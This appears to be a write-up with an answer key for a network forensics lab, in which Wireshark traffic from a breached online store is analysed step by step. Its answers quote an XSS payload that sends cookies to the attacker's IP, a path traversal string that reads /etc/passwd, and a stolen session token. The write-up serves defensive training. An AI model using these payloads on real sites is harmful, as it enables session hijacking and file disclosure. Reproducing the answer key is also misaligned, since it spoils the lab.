## Scenario
In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

## Tools
1. Wireshark

## Questions:
1. Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?
`111.224.180.128`

Check the `Statistics > Conversations > IPv4` the attacker's IP is stands out with highest packet count.

2. The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?
`gobuster`

Filter the packet records with the attacker's IP `ip.addr == 111.224.180.128 && http.request.method == "GET"` then in the Packet Details expand 'Hypertext Transfer Protocol' and check the 'User-Agent:' header.

3. Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?
`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

Since it asks for XSS it is better to look for the POST requests with the same IP `ip.addr == 111.224.180.128 && http.request.method == "POST"`. In the Packet Details > HTML Form URL Encoded expand the Form item and get the value the attacker injected in the form as a XSS.

4. Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?
`2024-03-29 12:09`

So if an admin has accessed the reviews page then it can be found using this `http.request.full_uri contains "reviews"`. Then just by looking at the packet logs the GET request to the same endpoint just after the attacker injected the payload from a different IP gives out the exact packet. Then just fetching the time from the `Frame`.

5. The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?
`lqkctf24s9h9lg67teu8uevn3q`

Check the previous packet details in the HTTP packet details. Copy the Cookie value and check when the attacker has accessed using the same cookie value because that was the token of the admin. Here is the filter for making it more visible `http && http.cookie contains "lqkctf24s9h9lg67teu8uevn3q"`.

6. Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?
`log_viewer.php`

In the same packet list there will be a packet with a path traversal exploiting payload. The file that is originating it form is the file.

7. Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?
`../../../../../etc/passwd`

Get the path traversal payload query from `HTTP > GET ... > Request URI > Request Query Parameter:`.